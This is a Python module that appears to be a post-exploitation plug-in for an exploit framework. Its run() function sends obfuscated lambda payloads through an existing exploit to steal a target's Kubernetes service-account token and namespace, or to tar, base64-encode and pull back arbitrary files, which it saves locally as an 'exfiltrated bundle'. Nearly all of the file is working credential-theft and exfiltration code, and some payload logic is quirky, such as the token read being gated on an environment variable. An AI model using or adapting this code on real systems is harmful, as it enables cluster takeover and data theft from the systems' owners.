import ast
import base64
import os

def run(exploit, param=None):
    # 1. INPUT SANITIZATION
    # Ensure param is a list of paths. If it's a single string, wrap it.
    if isinstance(param, str):
        paths = [param]
    elif isinstance(param, list):
        paths = param
    else:
        paths = ["token"]

    token_only = "--token-only" in paths
    # If "token" is the only thing or --token-only is present, switch to token mode
    mode = "token" if ("token" in paths or token_only) else "file/dir"

    if not token_only:
        print(f"\n[ SYSTEM EXFIL: {mode.upper()} RETRIEVAL ]")

    if mode == "token":
        exfil_payload = (
            "(lambda: (lambda os: str({p: (open(p).read() if os.environ.get('D') else 'NOT_FOUND') for p in ["
            "'/var/run/secrets/kubernetes.io/serviceaccount/namespace',"
            "'/var/run/secrets/kubernetes.io/serviceaccount/token'"
            "]}))(__import__('os')))()"
        )
    else:
        if not token_only:
            print(f"[*] Packaging {len(paths)} targets into a single Gzip archive...")
            for p in paths:
                print(f"  -> Adding: {p}")
        
        # Convert our local list of paths into a Python list-string for the payload
        paths_code = str(paths)
        
        # The payload iterates through the list 'p_list', adding each existing path to the tar
        exfil_payload = (
            f"(lambda: (lambda os, tarfile, io, b64: "
            f" (lambda p_list: (b64.b64encode((lambda b: (lambda t: [t.add(p, arcname=os.path.basename(p)) "
            f" for p in p_list if os.path.exists(p)][0] or t.close() or b.getvalue())(tarfile.open(fileobj=b, mode='w:gz')))"
            f" (io.BytesIO())).decode()))"
            f" ({paths_code}))(__import__('os'), __import__('tarfile'), __import__('io'), __import__('base64')))()"
        )

    result = exploit.execute(exfil_payload)

    # 3. Handling the Result
    try:
        if mode == "token":
            data = ast.literal_eval(result)
            token = data.get('/var/run/secrets/kubernetes.io/serviceaccount/token', '').strip()
            if token_only:
                print(token)
                return 
            ns = data.get('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'Unknown').strip()
            print(f"NAMESPACE : {ns}")
            print(f"TOKEN     : {token}")
        
        else:
            if not result or "ERROR" in result:
                print(f"[-] Retrieval failed or paths do not exist.")
            else:
                # Save as a generic collection or named after the first item
                output_file = "exfiltrated_bundle.tar.gz"

                with open(output_file, "wb") as f:
                    f.write(base64.b64decode(result))
                
                print(f"\nSTATUS    : Multi-target Transfer Successful")
                print(f"SAVED TO  : {output_file}")
                print(f"INFO      : Use 'tar -xzvf {output_file}' to extract the bundle")
            
    except Exception as e:
        if not token_only:
            print(f"Error: {e}")
            print(f"Raw Output: {result[:200]}")

    if not token_only:
        print(f"\n[ Exfil Complete ]\n")